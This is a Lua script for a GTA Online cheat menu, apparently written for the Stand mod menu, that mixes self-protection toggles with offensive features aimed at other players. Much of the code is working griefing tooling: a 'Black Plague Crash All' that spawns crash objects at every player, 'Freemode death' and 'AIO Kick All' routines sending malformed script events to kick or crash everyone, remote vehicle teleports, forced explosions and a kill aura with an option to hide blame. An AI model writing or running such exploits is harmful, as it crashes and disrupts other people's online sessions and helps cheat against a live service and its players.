local quitarf = protex2:list("Anti Freeze")

quitarf:action("Remove freeze V1", {}, "Tries to restart some natives to remove the freeze state from your character.", function()
    local player = PLAYER.PLAYER_PED_ID()
    ENTITY.FREEZE_ENTITY_POSITION(player, false)
    MISC.OVERRIDE_FREEZE_FLAGS(p0)
    menu.trigger_commands("rcleararea")
end)

quitarf:action("Remove freeze V2 'Test'", {}, "Tries to restart some natives to remove the freeze state from your character \nWith this one you'll die tho.", function()
    local player = PLAYER.PLAYER_PED_ID()
    local playerpos = ENTITY.GET_ENTITY_COORDS(player, false)
    ENTITY.FREEZE_ENTITY_POSITION(player, false)
    ENTITY.SET_ENTITY_SHOULD_FREEZE_WAITING_ON_COLLISION(player, false)
    ENTITY.SET_ENTITY_COORDS(player, playerpos.x, playerpos.y, playerpos.z, 1, false)
    MISC.OVERRIDE_FREEZE_FLAGS(p0)
    menu.trigger_commands("rcleararea")
end)

bloqmodders = protex2:list("Modder Protections", {}, "")

bloqmodders:toggle_loop("Block clones", {}, "Blocks the clones that try to spawn.", function()
    for i, ped in ipairs(entities.get_all_peds_as_handles()) do
    if ENTITY.GET_ENTITY_MODEL(ped) == ENTITY.GET_ENTITY_MODEL(players.user_ped()) and not PED.IS_PED_A_PLAYER(ped) and not util.is_session_transition_active() then
        util.toast("Clone Detected. Deleting")
        entities.delete_by_handle(ped)
        util.yield(150)
        end
    end
end)

bloqmodders:toggle("Prevent crashes", {}, "Tries to block the crashes \nActive if you're about to be crashed.", function(on_toggle)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    local ped = PLAYER.GET_PLAYER_PED(players.user())
    if on_toggle then
        util.yield(300)
        ENTITY.SET_ENTITY_COORDS(ped, 25.030561, 7640.8735, 17.831139, 1, false)
        util.yield(600)
        menu.trigger_commands("potatomode on")
        menu.trigger_commands("anticrashcamera on")
        menu.trigger_commands("trafficpotato on")
        util.yield(2000)
        menu.trigger_commands("rclearworld")
    else        
        menu.trigger_commands("potatomode off")
        menu.trigger_commands("anticrashcamera off")
        menu.trigger_commands("trafficpotato off")
        util.yield(800)
        ENTITY.SET_ENTITY_COORDS(ped, pos.x, pos.y, pos.z, false)
        util.yield(500)
        menu.trigger_commands("rclearworld")
        util.yield(1000)
        menu.trigger_commands("rcleararea")
        util.toast("Crash prevented :b")
    end
end)

bloqmodders:toggle_loop("Block PTFX", {}, "", function()
    local coords = ENTITY.GET_ENTITY_COORDS(players.user_ped() , false);
    GRAPHICS.REMOVE_PARTICLE_FX_IN_RANGE(coords.x, coords.y, coords.z, 400)
    GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
end)

if menu.get_edition() == 3 then
    bloqmodders:toggle_loop("Anti Beast", {}, "Prevents the game from picking you to be the beast in the online challenge.", function()
        if SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(util.joaat("am_hunt_the_beast")) > 0 then
            local host
            repeat
                host = NETWORK.NETWORK_GET_HOST_OF_SCRIPT("am_hunt_the_beast", -1, 0)
                util.yield()
            until host ~= -1
            util.toast(players.get_name(host).." started Hunt The Beast. Killing script...")
            menu.trigger_command(menu.ref_by_path("Online>Session>Session Scripts>Hunt the Beast>Stop Script"))
        end
    end)
end

bloqmodders:toggle_loop("Anti Transaction error ", {}, "Blocks my own script in order for this to work LMFAO.", function()
    if util.spoof_script("am_destroy_veh", SCRIPT.TERMINATE_THIS_THREAD) then
        util.toast("Finishing script (Detected)")
    end

    if HUD.GET_WARNING_SCREEN_MESSAGE_HASH() == -991495373 then
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1.0)
        util.yield(100)
    end
end)

bloqmodders:toggle("Keep me safe", {"safeass"}, "Uses some part of the natives to keep yourself on a safe state.", function()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    ENTITY.CREATE_MODEL_HIDE(pos.x, pos.y, pos.z, 10000.0, 1269906701, true)
    util.yield(75)
    ENTITY.CREATE_MODEL_HIDE(pos.x, pos.y, pos.z, 10000.0, -950858008, true)
    util.yield(75)
end)

local values = {
    [0] = 0,
    [1] = 50,
    [2] = 88,
    [3] = 160,
    [4] = 208,
}

local anticage = protex2:list("Anti-Jail", {}, "")
local alpha = 160
anticage:slider("Cage alpha", {"cagealpha"}, "Cage transparency. If it is on 0 you wont see it", 0, #values, 3, 1, function(amount)
    alpha = values[amount]
end)

anticage:toggle_loop("Enable Anti-Jail", {"anticage"}, "", function()
    local user = players.user_ped()
    local veh = PED.GET_VEHICLE_PED_IS_USING(user)
    local my_ents = {user, veh}
    for i, obj_ptr in ipairs(entities.get_all_objects_as_pointers()) do
        local net_obj = memory.read_long(obj_ptr + 0xd0)
        if net_obj == 0 or memory.read_byte(net_obj + 0x49) == players.user() then
            continue
        end
        local obj_handle = entities.pointer_to_handle(obj_ptr)
        CAM.SET_GAMEPLAY_CAM_IGNORE_ENTITY_COLLISION_THIS_UPDATE(obj_handle)
        for i, data in ipairs(my_ents) do
            if data ~= 0 and ENTITY.IS_ENTITY_TOUCHING_ENTITY(data, obj_handle) and alpha > 0 then
                util.toast("Someone is trying to cage you.")
                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(obj_handle, data, false)
                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(data, obj_handle, false)
                ENTITY.SET_ENTITY_ALPHA(obj_handle, alpha, false)
            end
            if data ~= 0 and ENTITY.IS_ENTITY_TOUCHING_ENTITY(data, obj_handle) and alpha == 0 then
                entities.delete_by_handle(obj_handle)
            end
        end
        SHAPETEST.RELEASE_SCRIPT_GUID_FROM_ENTITY(obj_handle)
    end
end)

local anti_mugger = protex2:list("Anti-Mugger")

anti_mugger:toggle_loop("Towards me", {}, "Blocks muggers that were supposed to mug you.", function()
    if NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        local ped_netId = memory.script_local("am_gang_call", 63 + 10 + (0 * 7 + 1))
        local sender = memory.script_local("am_gang_call", 287)
        local target = memory.script_local("am_gang_call", 288)
        local player = players.user()

        util.spoof_script("am_gang_call", function()
            if (memory.read_int(sender) ~= player and memory.read_int(target) == player 
            and NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(memory.read_int(ped_netId)) 
            and NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(memory.read_int(ped_netId))) then
                local mugger = NETWORK.NET_TO_PED(memory.read_int(ped_netId))
                entities.delete_by_handle(mugger)
                util.toast("Blocked mugger from " .. players.get_name(memory.read_int(sender)))
            end
        end)
    end
end)

anti_mugger:toggle_loop("Someone else", {}, "Blocks muggers from trying to mug other players.", function()
    if NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        local ped_netId = memory.script_local("am_gang_call", 63 + 10 + (0 * 7 + 1))
        local sender = memory.script_local("am_gang_call", 287)
        local target = memory.script_local("am_gang_call", 288)
        local player = players.user()

        util.spoof_script("am_gang_call", function()
            if memory.read_int(target) ~= player and memory.read_int(sender) ~= player
            and NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(memory.read_int(ped_netId)) 
            and NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(memory.read_int(ped_netId)) then
                local mugger = NETWORK.NET_TO_PED(memory.read_int(ped_netId))
                entities.delete_by_handle(mugger)
                util.toast("Block mugger sent by " .. players.get_name(memory.read_int(sender)) .. " to " .. players.get_name(memory.read_int(target)))
            end
        end)
    end
end)

local pool_limiter = protex2:list("Pool Limiter", {}, "")
local ped_limit = 175
pool_limiter:slider("Limiter pool/Peds", {"pedlimit"}, "", 0, 256, 175, 1, function(amount)
    ped_limit = amount
end)

local veh_limit = 200
pool_limiter:slider("Limiter pool/Vehicles", {"vehlimit"}, "", 0, 300, 150, 1, function(amount)
    veh_limit = amount
end)

local obj_limit = 750
pool_limiter:slider("Limiter pool/Objects", {"objlimit"}, "", 0, 2300, 750, 1, function(amount)
    obj_limit = amount
end)

local projectile_limit = 25
pool_limiter:slider("Limiter pool/Projectiles", {"projlimit"}, "", 0, 50, 25, 1, function(amount)
    projectile_limit = amount
end)

pool_limiter:toggle_loop("Activate limiter pool", {}, "", function()
    local ped_count = 0
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        util.yield()
        if ped ~= players.user_ped() then
            ped_count += 1
        end
        if ped_count >= ped_limit then
            for _, ped in pairs(entities.get_all_peds_as_handles()) do
                util.yield()
                entities.delete_by_handle(ped)
            end
            util.toast("Cleaning peds' bools...")
        end
    end
    local veh__count = 0
    for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
        util.yield()
        veh__count += 1
        if veh__count >= veh_limit then
            for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
                entities.delete_by_handle(veh)
            end
            util.toast("Cleaning vehicle's bools ...")
        end
    end
    local obj_count = 0
    for _, obj in pairs(entities.get_all_objects_as_handles()) do
        util.yield()
        obj_count += 1
        if obj_count >= obj_limit then
            for _, obj in pairs(entities.get_all_objects_as_handles()) do
                entities.delete_by_handle(obj)
            end
            util.toast("Cleaning object's bools...")
        end
    end
end)

local function pizzaCAll()
    for p = 0, 31, 1 do
        if p ~= players.user() and ENTITY.DOES_ENTITY_EXIST(getPlayerPed(p)) then
            for i = 1, 10 do
                local cord = getEntityCoords(getPlayerPed(p))
                requestModel(-930879665)
                wait(10)
                requestModel(3613262246)
                wait(10)
                requestModel(452618762)
                wait(10)
                while not hasModelLoaded(-930879665) do wait() end
                while not hasModelLoaded(3613262246) do wait() end
                while not hasModelLoaded(452618762) do wait() end
                local a1 = entities.create_object(-930879665, cord)
                wait(10)
                local a2 = entities.create_object(3613262246, cord)
                wait(10)
                local b1 = entities.create_object(452618762, cord)
                wait(10)
                local b2 = entities.create_object(3613262246, cord)
                wait(300)
                entities.delete_by_handle(a1)
                entities.delete_by_handle(a2)
                entities.delete_by_handle(b1)
                entities.delete_by_handle(b2)
                noNeedModel(452618762)
                wait(10)
                noNeedModel(3613262246)
                wait(10)
                noNeedModel(-930879665)
                wait(10)
            end
            if SE_Notifications then
                util.toast("Finished with player // " .. tostring(PLAYER.GET_PLAYER_NAME(p)) .. " // of index " .. p)
            end
        end
    end
end


-----------------------------------------------------------------------------------------------------------------

Pizzaall = allplaymal:action("Black Plague Crash All", {"plagueall"}, "Blocked by most menus.", function ()
    menu.show_warning(Pizzaall, 1, "This will crash everyone with the plague. Did you mean to click this?", pizzaCAll)
end)

allplaymal:action("Freemode death all.", {"allfdeath"}, "Will probably not work on some/most menus. A 'delayed kick' of sorts.", function ()
    for p = 0, 31 do
        if p ~= players.user() and NETWORK.NETWORK_IS_PLAYER_CONNECTED(p) then
            for i = -1, 1 do
                for n = -1, 1 do
                    util.trigger_script_event(1 << p, {-65587051, 28, i, n})
                end
            end
            for i = -1, 1 do
                for n = -1, 1 do
                    util.trigger_script_event(1 << p, {1445703181, 28, i, n})
                end
            end
            wait(100)
            util.trigger_script_event(1 << p, {-290218924, -32190, -71399, 19031, 85474, 4468, -2112})
            util.trigger_script_event(1 << p, {-227800145, -1000000, -10000000, -100000000, -100000000, -100000000})
            util.trigger_script_event(1 << p, {2002459655, -1000000, -10000, -100000000})
            util.trigger_script_event(1 << p, {911179316, -38, -30, -75, -59, 85, 82})
        end
        for i = -1, 1 do
            for a = -1, 1 do
                util.trigger_script_event(1 << p, {916721383, i, a, 0, 26})
            end
        end
    end
end)

TXC_SLOW = false

allplaymal:action("AIO Kick All.", {"allaiokick", "allaiok"}, "Will probably not work on some menus.", function ()
    menu.trigger_commands("scripthost")
    for i = 0, 31 do
        if i ~= players.user() and NETWORK.NETWORK_IS_PLAYER_CONNECTED(i) then
            util.toast("Player connected " .. tostring(PLAYER.GET_PLAYER_NAME(i) .. ", commencing AIO."))
            util.trigger_script_event(1 << i, {0x37437C28, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-1308840134, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {0x4E0350C6, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-0x114C63AC, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-0x15F5B1D4, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-0x249FE11B, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-0x76B11968, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {0x9C050EC, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {0x3B873479, 1, 15, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {0x23F74138, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-0x529CD6F2, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-0x756DBC8A, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-0x69532BA0, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {0x68C5399F, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {0x7DE8CAC0, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {0x285DDF33, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10) 
            util.trigger_script_event(1 << i, {-0x177132B8, math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647)})
            wait(10)
            util.trigger_script_event(1 << i, {memory.script_global(1893548 + (1 + (i * 600) + 511)), i})
            for a = -1, 1 do
                for n = -1, 1 do
                    util.trigger_script_event(1 << i, {-65587051, 28, a, n})
                    wait(10)
                end
            end
            for a = -1, 1 do
                for n = -1, 1 do
                    util.trigger_script_event(1 << i, {1445703181, 28, a, n})
                    wait(10)
                end
            end
            if TXC_SLOW then
                wait(10)
                util.trigger_script_event(1 << i, {-290218924, -32190, -71399, 19031, 85474, 4468, -2112})
                wait(10)
                util.trigger_script_event(1 << i, {-227800145, -1000000, -10000000, -100000000, -100000000, -100000000})
                wait(10)
                util.trigger_script_event(1 << i, {2002459655, -1000000, -10000, -100000000})
                wait(10)
                util.trigger_script_event(1 << i, {911179316, -38, -30, -75, -59, 85, 82})
                wait(10)
                util.trigger_script_event(1 << i, {-290218924, -32190, -71399, 19031, 85474, 4468, -2112})
                wait(10)
                util.trigger_script_event(1 << i, {-1386010354, 91645, -99683, 1788, 60877, 55085, 72028})
                wait(10)
                util.trigger_script_event(1 << i, {-227800145, -1000000, -10000000, -100000000, -100000000, -100000000})
                wait(10)
                for g = -28, 0 do
                    for n = -1, 1 do
                        for a = -1, 1 do
                            util.trigger_script_event(1 << i, {1445703181, i, n, a})
                        end
                    end
                    wait(10)
                end
                for a = -11, 11 do
                    util.trigger_script_event(1 << i, {2002459655, -1000000, a, -100000000})
                end
                for a = -10, 10 do
                    for n = 30, -30 do
                        util.trigger_script_event(1 << i, {911179316, a, n, -75, -59, 85, 82})
                    end
                end
                for a = -10, 10 do
                    util.trigger_script_event(1 << i, {-65587051, a, -1, -1})
                end
                util.trigger_script_event(1 << i, {951147709, i, 1000000, nil, nil}) 
                for a = -10, 10 do
                    util.trigger_script_event(1 << i, {-1949011582, a, 1518380048})
                end
                for a = -10, 4 do
                    for n = -10, 5 do
                        util.trigger_script_event(1 << i, {1445703181, 28, a, n})
                    end
                end
            end
            util.toast("Fourth block done. // AIO")
            util.toast("Iteration " .. i .. " complete of AIO kick.")
            util.toast("Player " .. PLAYER.GET_PLAYER_NAME(i) .. " done.")
        end
    end
    wait(100)
end)

allplaymal:toggle("Slower, but better AIO.", {}, "", function (on)
    if on then
        TXC_SLOW = true
    else
        TXC_SLOW = false
    end
end)

----------------------------------------------------------------------------

allplayoth:action("Remove Vehicle Godmode for All (BETA)", {"allremovevehgod"}, "Removes everyone's vehicle godmode, making them easier to kill :)", function ()
    for i = 0, 31 do
        if NETWORK.NETWORK_IS_PLAYER_CONNECTED(i) then
            local ped = getPlayerPed(i)
            if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
                local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
                ENTITY.SET_ENTITY_CAN_BE_DAMAGED(veh, true)
                ENTITY.SET_ENTITY_INVINCIBLE(veh, false)
            end
        end
    end
end)

allplayoth:action("Teleport everyone's vehicles to ocean (BETA)", {"alltpvehocean"}, "Teleports everyone's vehicles into the ocean.", function()
    local oldcoords = getEntityCoords(getLocalPed())
    for i = 0, 31 do
        if NETWORK.NETWORK_IS_PLAYER_CONNECTED(i) then
            local ped = getPlayerPed(i)
            local pedCoords = getEntityCoords(ped)
            for c = 0, 5 do
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(getLocalPed(), pedCoords.x, pedCoords.y, pedCoords.z + 10, false, false, false)
                wait(100)
            end
            if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
                local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
                for a = 0, 10 do
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, 4500, -4400, 4, false, false, false)
                    wait(100)
                end
                for b = 0, 10 do
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, 4500, -4400, 4, false, false, false)
                end
            end
        end
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(getLocalPed(), oldcoords.x, oldcoords.y, oldcoords.z, false, false, false)
end)

allplayoth:action("Teleport everyone's vehicles to Maze Bank (BETA)", {"alltpvehmazebank"}, "Teleports everyone's vehicles on top of the Maze Bank tower.", function()
    local oldcoords = getEntityCoords(getLocalPed())
    for i = 0, 31 do
        if NETWORK.NETWORK_IS_PLAYER_CONNECTED(i) then
            local pped = getPlayerPed(i)
            local pedCoords = getEntityCoords(pped)
            for c = 0, 5 do
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(getLocalPed(), pedCoords.x, pedCoords.y, pedCoords.z + 10, false, false, false)
                wait(100)
            end
            if PED.IS_PED_IN_ANY_VEHICLE(pped, false) then
                local veh = PED.GET_VEHICLE_PED_IS_IN(pped, false)
                for a = 0, 10 do
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, -76, -819, 327, false, false, false)
                    wait(100)
                end
                for b = 0, 10 do
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, -76, -819, 327, false, false, false)
                end
            end
        end
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(getLocalPed(), oldcoords.x, oldcoords.y, oldcoords.z, false, false, false)
end)

allplayoth:action("Check entire lobby for godmode", {}, "Checks the entire lobby for godmode, and notifies you of their names.", function()
    local godcount = 0
    for i = 0, 31 do
        if NETWORK.NETWORK_IS_PLAYER_CONNECTED(i) then
            local pcoords = getEntityCoords(getPlayerPed(i))
            if INTERIOR.GET_INTERIOR_AT_COORDS(pcoords.x, pcoords.y, pcoords.z) == 0 then 
                if (not PLAYER.IS_PLAYER_READY_FOR_CUTSCENE(i)) and (not NETWORK.IS_PLAYER_IN_CUTSCENE(i)) then 
                    if players.is_godmode(i) then 
                        local pName = getPlayerName_pid(i)
                        util.toast(pName .. " is in godmode!")
                        godcount = godcount + 1
                        wait(100)
                    end
                end
            end
        end
    end
    notification.normal(godcount .. " player(s) in ~r~godmode~w~!")
end)

allplayoth:action("Everyone explode-suicides", {"allsuicide"}, "Makes everyone commit suicide, with an explosion.", function()
    for i = 0, 31, 1 do
        if players.exists(i) then 
            local playerPed = getPlayerPed(i)
            local playerCoords = getEntityCoords(playerPed)
            if PED.IS_PED_IN_ANY_VEHICLE(playerPed, true) then
                for i = 0, 50, 1 do 
                    SE_add_owned_explosion(playerPed, playerCoords.x, playerCoords.y, playerCoords.z, 5, 10, SEisExploAudible, SEisExploInvis, 0)
                    wait(10)
                end
            else
                SE_add_owned_explosion(playerPed, playerCoords.x, playerCoords.y, playerCoords.z, 1, 10, SEisExploAudible, SEisExploInvis, 0)
            end
        end
    end
end)

MarkedForExt = {}
MarkedForExtCount = 1

ARAY_ExtinctionGun = false 

deletegun:toggle_loop("Better Delete Gun", {}, "", function ()
    local localPed = getLocalPed()
    if PED.IS_PED_SHOOTING(localPed) then
        local point = memory.alloc(4)
        local isEntFound = PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(players.user(), point)
        if isEntFound then
            local entt = memory.read_int(point)
            if ENTITY.IS_ENTITY_A_PED(entt) and PED.IS_PED_IN_ANY_VEHICLE(entt) then
                local pedVeh = PED.GET_VEHICLE_PED_IS_IN(entt, false)
                local maxPassengers = VEHICLE.GET_VEHICLE_MAX_NUMBER_OF_PASSENGERS(pedVeh) - 1
                for i = -1, maxPassengers do
                    local seatFree = VEHICLE.IS_VEHICLE_SEAT_FREE(pedVeh, i, false)
                    if not seatFree then
                        local targetPed = VEHICLE.GET_PED_IN_VEHICLE_SEAT(pedVeh, i, false)
                        MarkedForExt[MarkedForExtCount] = targetPed
                        if SE_Notifications then
                            util.toast("Marked for extinction! Index " .. MarkedForExtCount)
                        end
                        MarkedForExtCount = MarkedForExtCount + 1
                    end
                end
                MarkedForExt[MarkedForExtCount] = pedVeh
                if SE_Notifications then
                    util.toast("Marked for extinction! Index " .. MarkedForExtCount)
                end
                MarkedForExtCount = MarkedForExtCount + 1
            else
                MarkedForExt[MarkedForExtCount] = entt
                if SE_Notifications then
                    util.toast("Marked for extinction! Index " .. MarkedForExtCount)
                end
                MarkedForExtCount = MarkedForExtCount + 1
            end
        end
    end
end)

deletegun:action("Delete.", {}, "", function ()
    for i = 1, #MarkedForExt, 1 do
        entities.delete_by_handle(MarkedForExt[i])
    end
    MarkedForExt = {}
    MarkedForExtCount = 1
        util.toast("Deleted! Clearing deletion list...")
end)
deletegun:action("Clear Deletion List", {}, "", function ()
    MarkedForExt = {}
    MarkedForExtCount = 1
end)

KA_Radius = 20
KA_Blame = true
KA_Players = false
KA_Onlyplayers = false
KA_Delvehs = false
KA_Delpeds = false

menuToggleLoop(killaura, "KillAura", {"killaura"}, "Kills peds, optionally players, optionally friends, in a raidus.", function ()
    local tKCount = 1
    local toKill = {}
    local ourcoords = getEntityCoords(getLocalPed())
    local ourped = getLocalPed()
    local weaponhash = 177293209 
    local pedPointers = entities.get_all_peds_as_pointers()
    for i = 1, #pedPointers do
        local v3 = entities.get_position(pedPointers[i])
        local vdist = MISC.GET_DISTANCE_BETWEEN_COORDS(ourcoords.x, ourcoords.y, ourcoords.z, v3.x, v3.y, v3.z, true)
        if vdist <= KA_Radius then
            toKill[tKCount] = entities.pointer_to_handle(pedPointers[i])
            tKCount = tKCount + 1
        end
    end
    for i = 1, #toKill do
        if (not KA_Onlyplayers and not PED.IS_PED_A_PLAYER(toKill[i])) or (KA_Players) or (KA_Onlyplayers and PED.IS_PED_A_PLAYER(toKill[i])) then
            if toKill[i] ~= getLocalPed() then
                if not PED.IS_PED_DEAD_OR_DYING(toKill[i]) then
                    if PED.IS_PED_IN_ANY_VEHICLE(toKill[i]) then
                        local veh = PED.GET_VEHICLE_PED_IS_IN(toKill[i], false)
                        local pedcoords = getEntityCoords(toKill[i])
                        if not PED.IS_PED_A_PLAYER(toKill[i]) and KA_Delvehs then
                            entities.delete_by_handle(veh)
                        end
                        if KA_Blame then
                            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(pedcoords.x, pedcoords.y, pedcoords.z + 0.5, pedcoords.x, pedcoords.y, pedcoords.z, 1000, true, weaponhash, ourped, false, fastNet, -1, veh, true)
                            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(pedcoords.x, pedcoords.y, pedcoords.z - 0.5, pedcoords.x, pedcoords.y, pedcoords.z, 1000, true, weaponhash, ourped, false, fastNet, -1, veh, true)
                            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(pedcoords.x + 1, pedcoords.y, pedcoords.z + 0.5, pedcoords.x, pedcoords.y, pedcoords.z, 1000, true, weaponhash, ourped, false, fastNet, -1, veh, true)
                            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(pedcoords.x - 1, pedcoords.y, pedcoords.z + 0.5, pedcoords.x, pedcoords.y, pedcoords.z, 1000, true, weaponhash, ourped, false, fastNet, -1, veh, true)
                            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(pedcoords.x, pedcoords.y + 1, pedcoords.z + 0.5, pedcoords.x, pedcoords.y, pedcoords.z, 1000, true, weaponhash, ourped, false, fastNet, -1, veh, true)
                            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(pedcoords.x, pedcoords.y - 1, pedcoords.z + 0.5, pedcoords.x, pedcoords.y, pedcoords.z, 1000, true, weaponhash, ourped, false, fastNet, -1, veh, true)
                        else
                            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(pedcoords.x, pedcoords.y, pedcoords.z + 0.5, pedcoords.x, pedcoords.y, pedcoords.z, 1000, true, weaponhash, 0, false, false, -1, veh, true)
                            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(pedcoords.x, pedcoords.y, pedcoords.z - 0.5, pedcoords.x, pedcoords.y, pedcoords.z, 1000, true, weaponhash, 0, false, false, -1, veh, true)
                            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(pedcoords.x + 1, pedcoords.y, pedcoords.z + 0.5, pedcoords.x, pedcoords.y, pedcoords.z, 1000, true, weaponhash, 0, false, false, -1, veh, true)
                            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(pedcoords.x - 1, pedcoords.y, pedcoords.z + 0.5, pedcoords.x, pedcoords.y, pedcoords.z, 1000, true, weaponhash, 0, false, false, -1, veh, true)
                            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(pedcoords.x, pedcoords.y + 1, pedcoords.z + 0.5, pedcoords.x, pedcoords.y, pedcoords.z, 1000, true, weaponhash, 0, false, false, -1, veh, true)
                            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(pedcoords.x, pedcoords.y - 1, pedcoords.z + 0.5, pedcoords.x, pedcoords.y, pedcoords.z, 1000, true, weaponhash, 0, false, false, -1, veh, true)
                        end
                        wait(50)
                        if not PED.IS_PED_A_PLAYER(toKill[i]) and PED.IS_PED_DEAD_OR_DYING(toKill[i]) and KA_Delpeds then
                            entities.delete_by_handle(toKill[i])
                        end
                    else
                        local pedcoords = getEntityCoords(toKill[i])
                        if KA_Blame then
                            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pedcoords.x, pedcoords.y, pedcoords.z + 2, pedcoords.x, pedcoords.y, pedcoords.z, 1000, true, weaponhash, ourped, false, false, -1)
                        else
                            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pedcoords.x, pedcoords.y, pedcoords.z + 2, pedcoords.x, pedcoords.y, pedcoords.z, 1000, true, weaponhash, 0, false, false, -1)
                        end
                        wait(50)
                        if not PED.IS_PED_A_PLAYER(toKill[i]) and PED.IS_PED_DEAD_OR_DYING(toKill[i]) and KA_Delpeds then
                            entities.delete_by_handle(toKill[i])
                        end
                    end
                end
            end
        end
    end
    wait(100)
end)

killAuraSettings:slider( "KillAura Radius", {"karadius"}, "Radius for killaura.", 1, 100, 20, 1, function (value)
    KA_Radius = value
end)

killAuraSettings:toggle("Blame Killaura on Me?", {"kablame"}, "If toggled off, bullets will not be blamed on you.", function (toggle)
    if toggle then
        KA_Blame = true
    else
        KA_Blame = false
    end
end, true)

killAuraSettings:toggle("Target Players?", {"kaplayers"}, "If toggled off, will only target peds.", function (toggle)
    if toggle then
        KA_Players = true
        if KA_Onlyplayers then
            menu.trigger_commands("kaonlyplayers")
        end
    else
        KA_Players = false
    end
end)

killAuraSettings:toggle("Target ONLY Players?", {"kaonlyplayers"}, "If toggled on, will target ONLY players.", function (toggle)
    if toggle then
        KA_Onlyplayers = true
        if KA_Players then
            menu.trigger_commands("kaplayers")
        end
    else
        KA_Onlyplayers = false
    end
end)

killAuraSettings:toggle("Delete vehicles of peds?", {"kadelvehs"}, "If toggled on, will delete vehicles of non-player peds, which makes them easier to kill.", function (toggle)
    if toggle then
        KA_Delvehs = true
    else
        KA_Delvehs = false
    end
end)

killAuraSettings:toggle("Delete peds after shooting?", {"kasilent"}, "If toggled on, will delete the peds that you have killed.", function (toggle)
    if toggle then
        KA_Delpeds = true
    else
        KA_Delpeds = false
    end
end)

killAuraSettings:toggle_loop( "Draw Radius of Killaura?", {"kasphere"}, "Draws a sphere that shows your killaura range.", function ()
    local myC = getEntityCoords(getLocalPed())
    GRAPHICS._DRAW_SPHERE(myC.x, myC.y, myC.z, KA_Radius, 255, 0, 0, 0.3)
end)

